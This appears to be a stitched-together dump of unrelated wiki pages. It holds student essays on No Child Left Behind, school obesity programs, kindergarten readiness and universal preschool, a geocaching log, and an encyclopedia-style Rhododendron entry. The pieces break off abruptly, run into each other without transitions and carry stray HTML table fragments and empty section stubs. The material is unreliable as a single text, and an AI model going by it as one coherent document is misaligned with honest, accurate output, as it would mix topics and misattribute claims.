Highly Qualified Teacher (HQT) -  a teacher that proves that he or she knows the subjects he or she is teaching, has a college degree, and is state-certified.  Students must be taught by a HQT in core academic subjects.

&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;

The state-by-state Nation's Report Card results, released in October 2005, showed improved achievement in the earlier grades in which NCLB is focused. In the last two years, the number of fourth-graders who learned their fundamental math skills increased by 235,000—enough to fill 500 elementary schools!
Across-the-board improvements were made in mathematics and in fourth-grade reading. 

African American and Hispanic students posted all-time highs in a number of categories. 

Forty-three states and the District of Columbia either improved academically or held steady in all categories (fourth- and eighth-grade reading and fourth- and eighth-grade math). 

The Nation's Report Card Trial Urban District Assessments for Reading and Math, released in Dec. 2005, showed students in select urban school districts improving faster than their peers over the last two years.

Fourth-graders in 8 of 10 urban districts made larger gains in math than the national average. 

Fourth-graders in 7 of 10 urban districts made larger gains in reading than the national average. 

Eighth-graders in 7 of 10 urban districts made more progress in basic math skills than the national average. 

The Nation's Report Card Science 2005 Report found significant academic gains by fourth-graders.

Overall, fourth-graders improved four points in science achievement over 1996 and 2000 levels, with the lowest-performing students making the largest gains. 

African American and Hispanic fourth-graders made significant gains as well, narrowing the achievement gap. 

And the Nation's Report Card Trial Urban District Assessment for Science, released in Nov. 2006, showed narrower achievement gaps for low-income students than for the entire student body, between nearly all of the participating school districts and the nation. (Ed.gov, National Center for Education Statistics)

=='''How is it working locally?'''==

Between 2002 and 2005 (latest data available):

Fifth-grade reading proficiency increased by 7%.

Fifth-grade mathematics proficiency increased by 10%.

The black-white achievement gap in fifth-grade reading narrowed by 8%.

The black-white achievement gap in fifth-grade mathematics narrowed by 11%.

The Hispanic-white achievement gap in fifth-grade reading narrowed by 7%.

The Hispanic-white achievement gap in fifth-grade mathematics narrowed by 4%. (Ed.gov)

==Essay==

Explain the main purpose of the No Child Left Behind Act.

	No Child Left Behind was designed by George W. Bush as a means to improve low-performing schools and lessen the achievement gap between low-class and middle or upper-class students.  It is based on stronger accountability for results, more freedom for states and communities, proven education methods, and more choices for parents.

	Under No Child Left Behind, all children are accounted for and schools are responsible for making sure every child is learning.  Parents are given information and new options for their children to make sure that they have the appropriate learning experience.  Teachers can look at assessment data and see where they need to improve in their teaching methods.  Schools that are identified as in need of improvement can receive extra help and resources to raise the student achievement.

	The federal government increased the money given to localities for education and increased their flexibility in allocating the funds to different uses within the education system to include helping low income families, offering higher wages to teachers, offering after-school programs, rewarding schools that make great improvements in achievements, and more.

	Basically, the No Child Left Behind Act provides a huge increase in federal resources to states to improve low-performing schools.  In exchange, the federal government expects more accountability from state education systems and the guarantee that no child will be left behind.  To meet this expectation, states are required to increase student testing, collect and disseminate results, ensure a highly qualified teacher in every classroom, and guarantee that all students, regardless of socioeconomic factors, achieve a proficient level of education by the 2014-2015 school year.

Finally! We arrived here and started to persuade our creaking and aching bodies around the final stage of this excellent series, because by hook or by crook we WERE going to complete this series in one day. It didn't matter that it was dark and we were ill equipped. It didn't matter that it started to rain. We didn't care that we had fat chance of seeing our beds before midnight. Who cares if we were so tired we started to make all sorts of silly errors. Big thanks to Moote, out PAF for today and also to the cache setter who even volunteered to come out when they were rung up and whinged at.

It was here we bumped into Crazy Frog and family (apologies from me too for not catching all your caching names... CF was easy to remember because of all the frogs all over her and the car!!). The two young lads who had been round all the caches that we had been round (even if it was over two days) and were STILL being as keen as anything, even long after their bedtime, was very inspiring! Well done to you! Puts us old farts to shame.

The incentive of finishing the series gave us just enough energy to drag our tired bodies that last leg, and we were glad we did. 2202 was well incentivised anyhow(is that such a word?) as he was aiming for (and got) his 500th cache with this one. Well done Tony. A spot of comedy furtling about in the dark later and voila! one cache. Thanks for the cache and thanks for the series MarkB! Now, can I have some sleeeeeeeeeeeeep please?

      <text xml:space="preserve">=='''Should Schools Play a Role in Early Childhood Health?'''==
Krystal Militich              

=='''The Problem'''== 
In 2002 the Center for Disease and Control reported that 16.9% of boys and 14.7% of girls are overweight (www.CDC.gov). Schools play an important role in children’s lives and can do more than any other institution to promote lifetime health.  School nurses confront issues around children who are overweight on a daily basis.  The Surgeon General released a “call to action” encouraging schools to join a nationwide effort to prevent overweight children.  &quot;Communities can help when it comes to health promotion and disease prevention,&quot; said former Surgeon General Dr. David Satcher, “When school lunchrooms or workplace cafeterias don't offer healthy and appealing food choices, that is a community responsibility.” (Healthlink) 

=='''What Schools Can Do'''==
·	Schools can provide a quality nutrition education and physical education program that helps students develop the knowledge, attitudes, skills and behaviors to adopt, maintain, and enjoy healthy eating habits and a physical lifestyle.  
·	The state can ensure that school meal programs meet the nutritional standards according to the food pyramid.  
·	They can remove any and all junk food and beverages from the building and school events (i.e. vending machines and school stores that may sell them)
·	Ensure that an adequate amount of time is provided for students to eat school meals. 
The Center for Disease and Control have published guidelines that identify school policies and practices most likely to be effective in promoting lifelong physical activity and healthy eating (Dietz, ''et al.'', 2004):

·        '''1'''-Address physical activity and nutrition through a Coordinated School Health Program (CSHP) approach. This approach focuses (1) health education; (2) physical education; (3) health services; (4) nutrition services; (5) counseling, psychological, and social services; (6) healthy school environment; (7) health promotion for staff; and (8) family and community involvement. 

·       ''' 2'''-Designate a school health coordinator and maintain an active school health council. The coordinator is in charge of managing and coordinating all school health policies, programs, activities, and resources.

·	'''3'''-Assess the school’s health policies and programs and develop a plan for improvement. The school health council can use CDC’s School Health Index: A Self-Assessment and Planning Guide to identify strengths and weaknesses of current health policies and practices.

·	'''4'''-Strengthen the school’s nutrition and physical activity policies. For example, a 2003 Arkansas law requires that elementary schools stop selling food or soft drinks in vending machines to students. A Connecticut law passed in 2004 requires school boards to offer K-5 students a period of physical exercise each day. 

·	'''5'''-Implement a high-quality health promotion program for school staff.  It gives the staff the skills and motivation they need to become powerful role models for good health.

·	'''6'''-Implement a high-quality course of study in health education.  To address obesity, health education curricula should emphasize the importance of implementing strategies to increase healthy eating and physical activity.

·	'''7'''-Implement a high-quality course of study in physical education. It should emphasize knowledge and skills for a lifetime of physical activity, meet the needs of all students, keep students active for most of the physical education class time, teach self-management as well as movement skills, and is an enjoyable experience for students.

·	'''8'''-Increase opportunities for students to engage in physical activity.  Include recess periods for unstructured play, after-school programs, intramural sports programs, and physical activity clubs.

·	'''9'''-Implement a quality school meals program. Provide students with enough time and a safe, clean, and pleasant are in which to eat.

·	'''10'''-Ensure that students have appealing, healthy choices in foods and beverages offered outside of the school meals program.

border: solid 1px #FFBDBD; padding: 1em;&quot; valign=top&gt; Sidebar: All children are naturally at their “skinniest” when they are between 4 and 6 years old (Lumeng, 2005).&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;

=='''Integrated Approach'''==
Teachers can integrate nutrition education into core curriculum areas, including math, science, language arts and social science.  The integrated approach allows teachers to teach students about percentages while showing them how to use the Nutrition Facts labels on foods to make wise food choices.  They can create a garden project where the children plant and eat the fruits and vegetables they grow.

=='''Studies'''==
In 2002, 16 percent of 6-19-year-olds were overweight (see Figure 1, Dietz). Nearly one in three children are overweight or at risk for becoming overweight.  Being overweight is now the most common health problem facing U.S. children (Strauss &amp; Pollack, 2001). There is substantial evidence that obesity in childhood lays the groundwork for adult cardiovascular disease.  Evidence suggests that even children as young as 2 years learn food preferences from their peer group (Lumeng, 2005).  Only 2% of children meet all the recommendations of the Food Guide Pyramid, 16 % do not meet any recommendations (Muñoz, Krebs-Smith, Ballard-Barbash, &amp; Cleveland, 1997). For out five children don’t consume the minimum recommended amount of five fruits and vegetables daily (Munoz, ''et al.'', 1997).

=='''Arkansas'''==
In 2004 Governor Mike Huckabee of Arkansas decided to send home obesity report cards to warn parents of overweight kid’s health risks (DeMillo, 2007).  Since Arkansas adopted its school-based anti-obesity program, California, Florida and Pennsylvania have launched similar efforts.  However, some lawmakers say that telling parents their children weigh too much could hurt children’s self-esteem.  Some also question whether it’s the role of schools to monitor student’s weight.  Dr. Karen Young of Arkansas Children’s Hospital says that fat children have self-esteem problems regardless of what anyone says (DeMillo, 2007).  Last year, a study showed that the percentage of Arkansas children who were overweight or at risk of becoming overweight was 37.5 percent, down from 38.1 percent in 2004.

=='''Conclusion'''==
The obesity epidemic is one of the greatest public health challenges of this century.  Without help from our schools, we are not likely to reverse this epidemic. Some schools have taken a stand against this fight and intend to do everything possible to prevent their students from becoming obese.

=='''Essay Answer'''==
	If I noticed an increase in my overweight students I would try to do everything possible to reverse the trend.  I would send weekly letters home telling the parents what their children are doing to be healthy.  I would send a list home of foods that the children can and can’t bring to class for snack and lunch.  I’m aware that some parents will be offended by this, but in order to ensure that all the kids eat healthy it has to be done.  Our class would plant vegetables and fruits in our garden, and they would eat them for as snacks.  My students would be active all day, whether it’s in play or learning.  I would try to incorporate body moving in every activity.  Research has shown that the brain remembers more when every part is being utilized.

'''''Rhododendron''''' (from the Greek: ''rhodos'', &quot;rose&quot;, and ''dendron'', &quot;tree&quot;) is a genus of flowering plants in the family Ericaceae. It is a large genus with over 800 species. and most have showy flower displays. It includes the plants known to gardeners as azalea, which was once treated as a separate genus.

Species of ''Rhododendron'' are widely distributed, occurring throughout most of the Northern Hemisphere except for dry areas, and extending into the Southern Hemisphere in southeastern Asia and northern Australasia. The highest species diversity is found in the Sino-Himalayan mountains from central Nepal and Sikkim east to Yunnan and Sichuan, with other significant areas of diversity in the mountains of Indo-China, Korea, Japan and Taiwaan. In addition, there are a significant number of tropical rhododendron species from southeast Asia to northern Australia, with 55 known species in Borneo and 164 in New Guinea&lt;ref name=&quot;Argent 2006&quot;&gt;Argent, G. ''Rhododendrons of subgenus Vireya''. 2006. Royal Horticultural Society. ISBN 1-902896-61-0&lt;/ref&gt;. Relatively fewer species occur in North America and Europe.  Rhododendrons have not been found in South America or Africa.

==Description==
The species are shrubs and small to (rarely) large trees, the smallest species growing to 10-20 cm tall, and the largest, ''R. arboreum'', reported to 50 m tall. The leaves are spirally arranged; leaf size can range from 1-2 cm to over 50 cm, exceptionally 100 cm in ''R. sinogrande''. They may be either evergreen or deciduous. In some species the underside of the leaves are covered with scales (lepidote) or hairs (indumentum). ; some of the best known species are noted for their many clusters of large trumpet-shaped flowers. There are however alpine species with small flowers or with small leaves. 

==Growing conditions==
Most species require rich, moist, but well drained soils, sun to shade. Like other ericaceous plants, most rhododendrons prefer acid soils with a pH of roughly 4.5-5.5.  Rhododendrons have fiberous roots and prefer well-drained soils high in organic material.  In areas with poorly-drained or alkaline soils, rhododendrons are often grown in raised beds using mediums such as composted pine bark.&lt;ref&gt;[http://www.rhododendron.org/soil.htm Soil information for planting rhododendrons]&lt;/ref&gt;.  Mulching and careful watering are important, especially before the plant is established.

==Species==
Rhododendrons are extensively hybridized in cultivation, and natural hybrids often occur in areas where species ranges overlap. There are over 28,000 cultivars of Rhododendron in the [http://www.rhs.org.uk/plants/registration_rhododendron.asp International Rhododendron Registry] held by the Royal Horticultural Society. Most have been bred for their flowers, but a few are of garden interest because of ornamental leaves and some for ornamental stems.

Some species (e.g. ''[[../Rhododendron ponticum/]]'' in the United Kingdom) are invasive as introduced plants, spreading in woodland areas replacing the natural understory. R. ponticum is difficult to eradicate, as its roots can make new shoots. 

The species are organised by subgenus, section, subsection and series. These are currently divided into four large and four small subgenera:
*Subgenus ''Rhododendron'' L.: small leaf or lepidotes (with scales on the underside of their leaves); several hundred species, type: ''[[../Rhododendron ferrugineum/]]''. The tropical rhododendrons (sect. ''Vireya'', about 300 species) are usually included as a section in this subgenus, but sometimes split off as a ninth subgenus.
*Subgenus ''Hymenanthes'' (Blume) K.Koch: large leaf or elepidotes (without scales on the underside of their leaves); about 140 species, type: ''[[../Rhododendron degronianum/]]''.
*Subgenus ''Pentanthera'' G.Don: deciduous azaleas; about 25 species, type ''[[Rhododendron luteum]]''.
*Subgenus ''Tsutsusi'': about 15 species; type ''[[../Rhododendron indicum/]]''. 
*Subgenus ''Azaleastrum'' Planch.: five species; type ''[[../Rhododendron ovatum/]]''.
*Subgenus ''Candidastrum'' (Sleumer) Philipson &amp; Philipson: one species; ''[[../Rhododendron albiflorum/]]''. 
*Subgenus ''Mumeazalea'': one species, ''[[../Rhododendron semibarbatum/]]''.
*Subgenus ''Therorhodion'': one species, ''[[../Rhododendron camtschaticum/]]''. 

Recent genetic investigations have caused an ongoing realignment of species and groups within the genus, and also have caused the old genus ''Ledum'' to be reclassified within subgenus ''Rhododendron''. Further realignment within the subgenera is currently proposed &lt;ref name=&quot;Goetsch et al.&quot;&gt;Goetsch, L. A., Eckert, A. J. &amp; Hall, B. D. (2005). [http://www.ingentaconnect.com/content/aspt/sb/2005/00000030/00000003/art00012 The molecular systematics of Rhododendron (Ericaceae): A Phylogeny based upon RPB2 gene sequences]. ''Sys. Bot''. 30(3): 616-626.&lt;/ref&gt;, including the merging of subgenus ''Hymenanthes'' into subgenus ''Pentanthera''. Most species prefer acidic soil conditions; some tropical Vireyas, and other species, grow as epiphytes.

==Uses==
Both species and hybrid rhododendrons (including azaleas) are used extensively as ornamental plants in landscaping in many parts of the world, and many species and cultivars are grown commercially for the nursery trade. Rhododendrons are often valued in landscaping for their structure, size, flowers, and the fact that many of them are evergreen &lt;ref name=Huxley&gt;Huxley, A., ed. (1992). ''New RHS Dictionary of Gardening''. Macmillan&lt;/ref&gt;. Azaleas are frequently used around foundations and occasionally as hedges, and many larger-leafed rhododendrons lend themselves well to more informal plantings and woodland gardens, or as specimen plants. In some areas, larger rhododendrons can be pruned to encourage more tree-like form, with some species such as ''R. arboreum'' and ''R. falconeri'' eventually growing to 10-15 m or more tall &lt;ref name=Huxley/&gt;.

==Maintenance==
&lt;!--discuss any special maintenance concerns, such as pruning, transplanting, monitoring, etc.--&gt;

==Propagation==
&lt;!--discuss propagation--&gt;

==Harvesting==
Some species are poisonous to grazing animals. Some Rhododendrons have a toxin called grayanotoxin in their pollen and nectar. People have been known to become ill from eating honey made by bees feeding on rhododendron and azalea flowers. Xenophon described the odd behavior of Greek soldiers after having consumed honey in a village surrounded by rhododendrons. Later, it was recognized that honey resulting from these plants have a slightly hallucinogenic and laxative effect. The suspect rhododendrons are ''[[../Rhododendron ponticum/]]'' and ''[[../Rhododendron luteum/]]'' (formerly ''Azalea pontica''), both found in northern Asia Minor. Eleven similar cases have been documented in Istanbul, Turkey during the 1980s &lt;ref name=&quot;Poison honey&quot;&gt;Nurhayat Sütlüpmar, Afife Mat and Yurdagül Satganoglu ''[http://www.springerlink.com/content/w322484735r06208/ Poisoning by toxic honey in Turkey]''. Archives of Toxicology. Volume 67, Number 2, pages 148-150, February, 1993 &lt;/ref&gt;.

==Pests and diseases==
There are a number of insects that either target rhododendrons or opportunistically will attack them.  Rhododendron borers and various weevils are major pests of rhododendrons, and many caterpillars will attack rhododendrons.  Major diseases include ''[[Phytophthora]]'' root rot, stem and twig fungal diebacks; [[Ohio State University Extension]] provides [http://www.ag.ohio-state.edu/~ohioline/hyg-fact/3000/3043.html information on maintaining health of rhododendrons].

''Rhododendron'' species are used as food plants by the larvae of some [[../Lepidoptera/]] species.

      <text xml:space="preserve">[Kindergarten Readiness 1]






===&quot;Introduction:&quot;=== 


The history of kindergarten  is important because it became the first large-scale early childhood program (Harris, K., &amp; Knudsen-Lindauer, S. L. 1988 pp. 61-73).The importance of the kindergarten readiness stems from the need to better prepare our children and to understand what is expected from our children as we 
send them to school maybe for the first time. A child will admitted into the program at various times due to birthday regulations that vary from state to state these deadlines schools use to determine who can enter the next kindergarten class. Your child must reach the age of 5 by the cutoff date. Starting school is an important time for young children, their families, and educators. Kindergarten is a time for children to expand their love of learning, their general knowledge, their ability to get along with others, and their interest in reaching out to the world. (Harris, 
K., &amp; Knudsen-Lindauer, S. L. 1988 p.p 61-73) The fifth birthday is approaching and that brings the first of formal education to a child’s life. It is important to help prepare a child for kindergarten and the road ahead.

==What to expect:==
In kindergarten, a child will develop skills in many areas . However, kindergarten makes up only a small part of each day. The key to a successful school year is a strong partnership between home and school. The following are ideas that are used in  many schools to help a child to prepare for the up and coming kindergarten year. The exposure to various important skills will be helpful such as: Counting out loud to 10 ,recognizing numbers 0-10 ,recognizing capital and lowercase letters of the alphabet , recognizing and drawing the four basic shapes (square, circle, rectangle, triangle),recognizing and writing his/her first name, 
buttoning and zipping clothing, tying  shoelaces, coloring and cutting, listening and following directions, sharing and taking turns these will help a future student  to become  successful and help the kindergartner to improve their educational outcome. There are many studies that look at the interaction of teachers, parents  
and the community and how they contribute as critical roles in the early education of children (Journal of Early Childhood Research, Vol. 4, No. 3, 223-258, 2006). Children need to be made to feel good about who they are and that learning can be fun. Developing a love for learning and knowledge is an important life-long tool 
for every child.

==When a child Enters==
When a child enters Kindergarten with confidence they will share their knowledge and speak more comfortably. But if children aren't ready, beginning school can be confusing and embarrassing, even frightening.The best way to help support a child in the route to kindergarten would be to attend the kindergarten orientation visit the school, arrange a tour of the school bus, involve your child in shopping for supplies and let him organize his backpack, and practice self-help skills. It is important to work with your 
child and the teachers as a team, the new world of school can be an exciting adventure and positive experience. It important that it is known that  young children learn differently than older children, their schooling must be different. Thus, their teachers require special training to insure growth and development. It has been noted that kindergarten is &quot;one of the major challenges children have to face in their early childhood years&quot; (Victorian Department of School Education, 1992, p. 44)  Parents and early childhood educators, on the other hand, have emphasized the importance of children adjusting socially to the school environment. It is important that children are playing and working with materials or other children. According to NAEYC, the following are good signs of a properly ran kindergarten classroom: Here are ten listed signs of a good kindergarten]

==A good classroom:== 

1. Children have access to various activities throughout the day, such as block building, pretend play, picture 
books, paints and other art materials, and table toys such as legos, pegboards, and puzzles. 
2. Teachers work with individual children, small groups, and the whole group at different times during the day. 
3. The classroom is decorated with children’s original artwork, their own writing with invented spelling, and 
dictated stories. 
4. Children learn numbers and the alphabet in the context of their everyday experiences. 
5. Children work on projects and have long periods of time (at least one hour) to play and explore. 
6. Children have an opportunity to play outside every day that weather permits. This play is never sacrificed 
for more instructional time. 
7. Teachers read books to children throughout the day, not just at group story time. 
8. Curriculum is adapted for those who are ahead as well as those who need additional help. Because children 
differ in experiences and background, they do not learn the same things at the same time in the same way. 
9. Children and their parents look forward to school. Parents feel safe sending their child to kindergarten. 
Children are happy; they are not crying or regularly sick. 
10. Individual kindergarten classrooms will vary, and curriculum will vary according to the interests and 
backgrounds of the children. But all developmentally appropriate kindergarten classrooms will have one thing in common: the focus will be on the development of the child as a whole. 
(1990. Washington, DC: NAEYC) NAEYC is an orgnization that works toword positively building early childhood education by offering training and programs to schools and individuals. They offer studies that are based upon  actual research which help further development in young children.

==Sum it up: What Kindergarten should be.........==

==Essay : ==

What is &quot;readiness,&quot; but what does it really mean? How does a parent know if there  child is &quot;ready?&quot; How does anyone know?
Being &quot;ready&quot; for Kindergarten means, merely that your child is able to learn what will be taught in the 
kindergarten he or she will attend, and can do the expected tasks  comfortably with teachers and other children 
in that setting. Since learning builds on learning, this means that a child needs to have acquired the skills, 
information, and attitudes that are necessary to do this, and have the ability to get along with others and be 
part of a group. When many parents think about Kindergarten readiness, they sometimes wonder and think  too 
much on academics, but the skills that define readiness are far broader than knowing letters, numbers, and how 
to count. To be ready for Kindergarten, a child should have a positive attitude toward starting school, some 
understanding of why he or she is there, and be open to learning new and exciting things and making new 
friends. The best way to learn what will be expected of your child is to contact the school your child will 
attend, schedule a tour and speak to the teachers that will possible be your child’s teacher. As far as 
wondering if anyone knows you as a parent should prepare your child by offering yourself as a great role model. 
I hope that you enjoyed my thoughts about kindergarten readiness...................

'''What is it?'''
		
'''Jennifer Robusto'''

Universal Preschool is a nationwide program that replaces the private preschool system with a taxpayer funded system (Snell, 2006). Several states have implemented a universal preschool plan and more are likely to follow their lead (Snell, 2006). 

=='''Support for Universal Preschool'''==

Universal preschool can create equal opportunity for success for all students because all receive the same quality education regardless of family income available (Doyle, 2005). Universal schools diminish the achievement gap (Doyle, 2005). 
Quality preschool programs result in higher academic performance (Doyle, 2005). Students who go through these types of programs are better prepared for school (Doyle, 2005). They are more likely to graduate from high school and less likely to be put in special education classes through out their educational career (Doyle, 2005). Problems in school readiness and educational failure are not strictly problems existing only to children living in poverty (Barnett, 2004). Preschool increases early reading and math skills in kindergarten and the first grade (Barnett, 2004). These increases are even higher for disadvantaged American children (Barnett, 2004). These same at risk students are less likely to be retained if they have attended a quality preschool (Smith, 2004). Universal preschool has the potential to make great long term benefits because it includes everyone (Barnett, 2004). At risk children who receive a high quality preschool education are less likely to commit crimes in adulthood (Doyle, 2005). Those who do not receive this type of early education are more likely to become career criminals of more violent crimes (Doyle, 2005). The universal programs that also provide support services for the entire family reduce child neglect and abuse which also impacts future criminal behavior (Doyle, 2005).

&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;

Research has found a monetary return to society (Doyle, 2005). For every one dollar invested in preschool approximately seventeen dollars are saved by society (Doyle, 2005). This money is saved by cutting crime, welfare, and other public costs (Doyle, 2005). This return is not even including the higher wages and contributions that the adult is able to gain from their participation in a preschool program (Doyle, 2005). Universal preschool is one of the best public investments a state can make (Smith, 2004). 

=='''Opposition to Universal Preschool'''==

The current preschool system includes a diverse group of public and private preschools (Snell, 2006). Creating a universal preschool would eliminate that system and create a state controlled monopoly on preschool (Snell, 2006). The government preschool creates a “one-size-fits-all approach” to teaching students (Snell, 2006). Different students have different educational needs that can all be met in the same way (Snell, 2006). Taxpayers would have to help pay for education the wealthy as well as the poor children (Snell, 2006). The economic benefits to society may be skewed (Snell, 2006). All of those programs used for research had intense family and school interventions (Snell, 2006). There were home visits, nutritional and medical services provided, and tutoring available until the third grade (Snell, 2006). It is hard to say which of the factors benefited the disadvantaged children (Snell, 2006). States that have had universal preschool programs for years are not improving (Snell, 2006). Their scores are among the lowest in the country and they are making the worst gains overall (Snell, 2006). None of the top ten states had universal preschool programs (Snell, 2006). Studying test scores world wide does not give evidence to support universal preschool (Snell, 2006). American students perform among the highest through the forth grade in reading, science, and math (Snell, 2006). After the forth grade students scores begin to decline (Snell, 2006). By the twelfth grade, American students are among the lowest in the world (Snell, 2006). 

=='''Universal vs. Targeted Programs'''==

Targeting programs are said to have three advantages. They are more efficient with less cost to the public, they have a higher quality, and they receive greater support from the public (Barnett, 2004). Because at risk students show a higher benefit from early education the government should spend the education money on them and not on students whose parents can afford early education (Barnett, 2004). Because these targeted programs serve a smaller population of students they can focus on quality for the children with the greatest needs (Barnett, 2004). Targeted programs are more likely to be fully funded by the public because all of the money goes towards families who need it (Barnett, 2004). There are many targeted programs available from federal policy (Barnett, 2004). The biggest of these programs are Head Start and preschool special education. Forty states fund preschool initiatives that are targeted programs (Barnett, 2004). Most of these programs are targeted towards children who come from low income families (Barnett, 2004). These are the children who need to get the most help (Silverman, 2005). They do not have access to computers and educational family trips (Silverman, 2005). Targeting programs provide these opportunities (Silverman, 2005). 

Seeing so much evidence from research that says the foundations for literacy and other academic achievements begins before age five leads people to question why government schooling does not begin earlier (Barnett, 2004). One answer to this question would to be implementing a universal preschool (Barnett, 2004). Advocates for universal preschool say the three advantages of targeted programs are incorrect (Barnett, 2004). Targeted programs do not always serve the people they seek, and they sometimes serve those they are not supposed to (Barnett, 2004). In addition to not reaching all the desired students, it costs a great deal of money to search for the targeted students (Barnett, 2004). Targeted programs also tend to be of a poorer quality than originally thought (Barnett, 2004). Universal programs have better quality because they are not viewed as charity, and they also include the disadvantaged children in a more diverse setting (Barnett, 2004). Including all children helps everyone. Universal preschools seem to require a higher budget because it serves everyone, however, the program is perceived as more fair (Barnett, 2004). If the public perceives the program to be fair they are more likely to support it (Barnett, 2004). A high quality universal program would cost more, but it would also shift the costs away from middle income parents to taxpayers (Barnett, 2004). 

=='''Conclusion'''==
Long waiting lists show there is obviously a high demand for preschool (Doyle, 2005). The government can solve the problem of having to turn away students by implementing a universal preschool program (Doyle, 2005). Giving equal opportunity to high quality early education is key to helping many basic problems in the United States (Doyle, 2005).

=='''Essay Question and Response'''==
Decide which program you like best: targeting or universal. Explain your choice.

Preschools should be fair. Universal preschools provide the only opportunity to serve everyone equally. Most schools that are available to poorer students are of a lower quality. These are the students who need high quality preschools the most. They benefit more than other students. Middle income students are also in great need of universal preschool. They struggle to pay for preschool, but do not receive any help from targeting programs like Head Start. There are many students who fall into this category.  Including all students in the same program leads to more diversity within the classroom. This means all students will have more to learn from each other in an equal setting. More students will be prepared for kindergarten and the first grade. The achievement gap can be diminished with universal preschool. Higher achievement leads to better lives. More students will graduate from high school resulting in higher incomes. Less students will be retained and less will be put in special education. Retaining less students will save society money. In fact, universal can save society more money than it costs. There will be less serious crimes and less repeat offenders. There will be less people depending on welfare. Universal preschools also supply support for the student’s family. With all the support the schools supply to the families there are less reports of child abuse and neglect. 
So much research has shown the importance of schooling before the age of five. If the government knows how important it is to lay educational foundations at an early age it should supply access to preschool for everyone. 
Universal preschool has the best opportunity for society. It will save money in the long run for everyone. It is the fairest way to provide a true quality early education for all students.

      <text xml:space="preserve">==Universal Preschool== 
By: Barbara Dell


==Introduction==

Universal preschool is the idea that families should have access to quality preschool programs just as they do the public school system.  Universal preschools would allow 3 and 4 year old children access to quality preschool programs that help them to develop skills needed to be successful in kindergarten and beyond.  Advocates for universal preschools believe early education improves school readiness and achievement.  Evidence shows that the first five years of a child’s life is key to their long-term development and children who are part of a rich learning environment early on do better in school and in life.  Many educators, business leaders and economists are recognizing the benefits of providing quality early education to children and are supporting state funded preschools that are available to low-income families.  Other countries have also recognized this importance as nearly all 3 to5 year olds in France and Italy are enrolled in publicly funded preschool (Ferrandino &amp; Tirozzi, 2001).  There are many research studies highlighting the importance of preschools and many states have already begun providing publicly funded preschools for all 4 year old children.  This article will take a look at some of the research that highlights the benefits and cost of universal preschools and which states have already begun working towards preschool for all children.   

==History==

The idea of providing free preschools has been around for some time.  In 1965, the Head Start program was created to help poor preschool-aged children develop skills needed to be successful in public schools through access to education programs.  However it is the state funded preschools that have become more popular as more advocates for early education and legislators are creating and passing bills that support universal preschools.  Much of the awareness is raising from the dissatisfaction of the public school systems.  Many believe children are not performing at their grade level and that disadvantage children lack basic skills while advantaged children lack motivation.  The idea of universal preschool is thought to help schools succeed by preparing children and getting them ready to learn before they enter the public school system. This would give public school teachers the chance to shape their young minds and not have to worry about teaching basic skills.  Research done in the 90’s on early brain development also helped build support for the idea that learning starts before the children enter school at age 5 (Gormley, 2005).

&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;

==Research==
One of the most influential studies in early childhood education is the High/Scope Perry Preschool study.  It was the first study to look at the effects of preschool on educational placement, crime, earning and employment.  During this study, David Weikart followed 123 low-income African American children for 40 years to study the effects of preschool.  The children were broken into two groups, one group attending the Perry preschool class and the other not.  The group that attended the Perry preschool class not only had increased achievement on performance test but were more likely to graduate, find a job, have a higher median income, have fewer arrests and less likely to depend on welfare (Parks, 2000). 

In 1985, the Chicago Child-Parent Center began a study comparing low-income four years old who attended a comprehensive preschool to children who began a full-day kindergarten at age 5.  The results showed that the children who attended preschool had 41% fewer special education placements and grade retentions, a 29% higher high school graduation rate, and were 33% less likely to be arrested as juveniles (Ferrandino &amp; Tirozzi, 2001). 

Another well known study that researched the benefits of early childhood education was the Abecedarian Early Childhood Education Intervention.  This study took place in the 1970’s at the University of North Carolina at Chapel Hill.  The study followed children from low-income families that received full time, high-quality education from infancy to age 5.  The children received individualized educational activities which focused on social, emotional and cognitive development.  Their progress was monitored over time and consisted of follow-up studies at ages 12, 15 and 21.  Children who participated in the study showed higher cognitive test scores, higher academic achievement in math and reading and were more likely to attend a four-year college.  The children on average were older when they had their first child and their mothers achieved higher education and employment status (Early learning, later success). 

==Costs &amp; Benefits==

The research studies discussed above provide substantial evidence that children who receive quality education at an early age will benefit now and in their future.  However these studies cost money and so does starting a universal preschool program but how much and do the benefits outweigh the costs? When a cost-benefit analysis was done on these studies, it showed the benefits children received from these programs are worth the costs.  The Abecedarian Project showed a benefit/cost ratio of 4 to 1 which means for every dollar invested, society received four dollars in return.  The High/Scope Perry project and the Chicago study both showed a ratio of 7 to 1; every dollar invested, society received 7 dollars.  Other analysis’s concluded that children who take part in such programs earn about $143,000 more in their lifetimes over children who do not participate in the programs.  The parents of the these children also benefit because they are able to concentrate on their education and establish long lasting and more productive relationships with employers, allowing them job security and opportunities to make more money.  These programs are expensive and many government agencies experience sticker shock when they see the costs of such programs.  The High/Scope Perry project estimated $9,200 per child, per year and the Abecedarian Project cost about $13,900.  The estimated annual cost of providing quality early education to all low-income children under age 5 would be about $53 billion per year (Bracey &amp; Stellar, 2003).  The price is high but research studies show the long-term economical benefits may be higher.  The cost of schooling, welfare and criminal justice system may be reduced as children are less likely to repeat grades, need special education, break the law and be dependent on welfare. Such benefits are being noticed by states as they are taking on funding quality preschool programs (Barnett &amp; Hustedt, 2003). 

'''States Providing Universal Preschools'''

With the price of universal preschools high and the benefits higher, some states are starting quality programs for all 3 to 4 year olds.  In 1995, Georgia introduced the first statewide preschool program that would allow free education to all 4 year olds.  Other states are following New York, Oklahoma and Florida all have started their own programs and will continue to provide free education to all 4 year olds (Barnett &amp; Hustedt, 2003).  California, Illinois, New Mexico, West Virginia and other states are starting to move towards universal preschools as well.  Other states are doing so because they see the results from Georgia’s programs.  Research shows that children attending the programs in Georgia are making significantly higher test scores on cognitive development and exceeding national norms.  Oklahoma is showing improved results as well.  Students who normally lag behind are showing vast improvement on pre-reading, writing and math skills (Gormley, 2005).  

==Conclusion==
Universal preschool is a new idea that is rapidly becoming popular.  Many administrators, teachers, business leaders and economists believe children’s school and life achievement lies in quality preschool programs and many states agree.  Although they can be costly the benefits are proven to not only help the economy but help better the lives of the children and families involved.

* Explain the benefits of providing children with a quality preschool education.

